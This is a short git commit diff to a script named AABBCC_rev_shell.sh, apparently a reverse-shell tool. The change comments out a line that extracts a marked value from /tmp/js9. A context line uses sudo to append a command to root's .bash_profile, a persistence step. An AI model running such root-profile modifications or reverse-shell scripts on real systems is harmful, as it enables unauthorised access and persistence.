23fbfdceefdda981c3bbe5d0735f9dcccd6d6ccc
189er <108280451+189er@users.noreply.github.com>
2023-08-19 16:34:03 +0800

    Update AABBCC_rev_shell.sh

--- AABBCC_rev_shell.sh
+++ AABBCC_rev_shell.sh
@@ -44,7 +44,7 @@ sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 #ip_port7pxy2=$(echo "$PATH");
 ip_port7pxy2qw3=$(echo 123;echo "$PATH");
 
-ip_port7pxy2a=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9 );
+#ip_port7pxy2a=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9 );
 echo "flag_9832q$ip_port7pxy2a";
 
 
